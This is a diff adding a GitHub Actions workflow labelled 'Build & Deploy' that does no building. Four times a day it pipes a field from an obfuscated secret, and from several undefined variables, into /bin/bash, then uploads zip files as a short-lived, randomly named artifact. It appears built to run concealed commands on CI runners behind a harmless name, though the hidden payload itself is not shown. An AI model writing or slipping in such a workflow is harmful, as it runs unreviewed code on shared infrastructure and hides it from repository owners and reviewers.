@@ -1,0 +1,30 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 1,7,13,19 * * *'
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          qarnq6669: ${{ secrets.qarnq6669 }}
+        run: |
+          printf '%s' "$qarnq6669" | jq -r .sq27889 | /bin/bash
+          echo $fnh108 | jq -r .tb278 | /bin/bash
+          echo $nbcl88 | jq -r .dul2003 | /bin/bash
+          printf '%s' "$isw071" | jq -r .umcr17 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: ixa9SLDx
+          path: "*.zip"
+          retention-days: 1
